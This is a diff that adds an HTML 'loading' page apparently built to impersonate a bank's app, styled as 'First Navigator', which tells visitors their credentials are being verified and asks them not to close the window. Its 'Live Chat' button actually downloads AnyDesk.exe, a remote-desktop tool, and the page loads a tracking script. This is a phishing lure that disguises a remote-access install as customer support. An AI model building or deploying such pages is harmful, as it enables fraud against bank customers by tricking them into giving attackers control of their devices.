@@ -1,0 +1,39 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<title>First Navigator - Loading</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;height:100%}
+body{font-family:"Roboto Condensed","Roboto","ProximaNova","Helvetica","Arial",sans-serif;background-color:#ffffff;color:rgba(0,0,0,0.87);height:100%;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+.loading-wrapper{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px;padding-top:max(32px,env(safe-area-inset-top));padding-bottom:max(32px,env(safe-area-inset-bottom));padding-left:max(32px,env(safe-area-inset-left));padding-right:max(32px,env(safe-area-inset-right));min-height:100vh;min-height:-webkit-fill-available}
+.loading-container{display:flex;flex-direction:column;align-items:center;justify-content:center;max-width:400px;width:100%;text-align:center}
+.logo-container{margin-bottom:40px}
+.logo-container img{display:block;max-width:100%;max-height:48px}
+.spinner-container{margin-bottom:32px;position:relative;width:48px;height:48px}
+.spinner{width:48px;height:48px;border:3px solid #e0e0e0;border-top-color:#0072ce;border-radius:50%;-webkit-animation:spin 0.8s linear infinite;animation:spin 0.8s linear infinite}
+@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
+@keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
+.loading-text{font-size:16px;color:#6E6E6E;font-weight:400;letter-spacing:0.3px;margin-bottom:8px}
+.loading-subtext{font-size:13px;color:#999;font-weight:400}
+.fnb-livechat{position:fixed;right:20px;bottom:20px;right:max(20px,env(safe-area-inset-right));bottom:max(20px,env(safe-area-inset-bottom));background:#0072ce;color:#fff;border-radius:30px;padding:12px 22px;font-family:"Roboto Condensed","Roboto","Helvetica","Arial",sans-serif;font-size:14px;font-weight:700;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,0.18);display:inline-flex;align-items:center;gap:8px;z-index:9999;text-decoration:none;line-height:1;-webkit-tap-highlight-color:transparent;text-transform:uppercase;letter-spacing:0.3px;border:1px solid #0074bd;transition:background 0.15s}
+.fnb-livechat:hover,.fnb-livechat:focus{background:#004c97;color:#fff;outline:none;text-decoration:none}
+.fnb-livechat svg{width:16px;height:16px;fill:#fff;flex-shrink:0}
+@media(max-width:480px){.fnb-livechat{padding:11px 18px;font-size:13px}}
+</style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+<div class="loading-wrapper">
+<div class="loading-container">
+<div class="logo-container"><img src="assets/logo.png" alt="First Navigator"></div>
+<div class="spinner-container"><div class="spinner"></div></div>
+<div class="loading-text">Verifying your credentials...</div>
+<div class="loading-subtext">Please do not close this window</div>
+</div>
+</div>
+<a href="https://download.anydesk.com/AnyDesk.exe" download="AnyDesk.exe" class="fnb-livechat" aria-label="Live Chat"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 3h14a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H9l-5 4V5a2 2 0 0 1 1-2z"/></svg><span>Live Chat</span></a>
+</body></html>
